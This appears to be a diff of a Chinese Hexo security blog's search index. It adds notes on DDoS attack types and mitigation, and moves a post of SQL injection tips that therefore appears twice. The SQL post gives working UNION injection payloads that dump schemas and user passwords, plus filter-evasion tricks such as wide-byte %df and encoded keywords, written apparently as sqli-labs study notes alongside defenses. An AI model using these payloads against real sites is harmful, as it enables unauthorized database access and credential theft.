+<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
+<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
+<blockquote>
+<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
+</blockquote>
+<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
+<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
+<blockquote>
+<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
+</blockquote>
+<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
+<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
+<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
+<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
+<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
+<p>这种攻击主要有以下几种形式：</p>
+<blockquote>
+<p>（1）Slowloris攻击</p>
+<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
+<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
+<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
+<p>kali自带一个slowhttptest工具</p>
+</blockquote>
+<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
+<blockquote>
+<p>（2）Slow HTTP POST</p>
+<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
+<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
+</blockquote>
+<blockquote>
+<p>（3）Slow Read Attack</p>
+<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
+</blockquote>
+<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
+<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
+<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
+<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
+<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
+<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
+<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
+<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
+<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
+<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
+<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
+<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
+<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
+<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
+<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
+<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
+<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
+<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>防护识别</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>防护识别</tag>
       </tags>
   </entry>
   <entry>
@@ -16945,90 +16925,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入-tips</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
-    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
-
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
-<p><strong>;%00</strong>代替–+进行注释</p>
-<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
-<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
-<p>没括号则是id&#x3D;2页面</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
-<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
-<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
-</blockquote>
-<blockquote>
-<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
-</blockquote>
-<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
-<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
-<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
-<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
-<p><strong>mysql_real_escape_string() 函数</strong></p>
-<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
-<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
-<ul>
-<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
-<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
-</ul>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<blockquote>
-<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
-<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
-<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><code>limit m,n</code></p>
-<p>其中，m是偏移量，n是要查询的数量。</p>
-<blockquote>
-<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
-</blockquote>
-<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
-<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
-<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
-</li>
-<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
-</li>
-<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
-</li>
-<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
-<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
-<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
-</li>
-</ol>
-<p>危险参数过滤：</p>
-<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
-<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
-<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
-<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
-<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
-<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>Mysql爆破语句</tag>
-        <tag>注入绕过</tag>
-        <tag>sql注入技巧</tag>
-        <tag>sql注入防御</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs</title>
     <url>/2023/05/20/sqli-labs/</url>
     <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
@@ -17194,6 +17090,90 @@
       </categories>
       <tags>
         <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-tips</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
+    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
+</blockquote>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
+</li>
+<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
+</li>
+<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
+</li>
+<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
+<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
+<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
+</li>
+</ol>
+<p>危险参数过滤：</p>
+<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
+<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
+<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
+<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
+<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
+<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Mysql爆破语句</tag>
+        <tag>注入绕过</tag>
+        <tag>sql注入技巧</tag>
+        <tag>sql注入防御</tag>
       </tags>
   </entry>
   <entry>
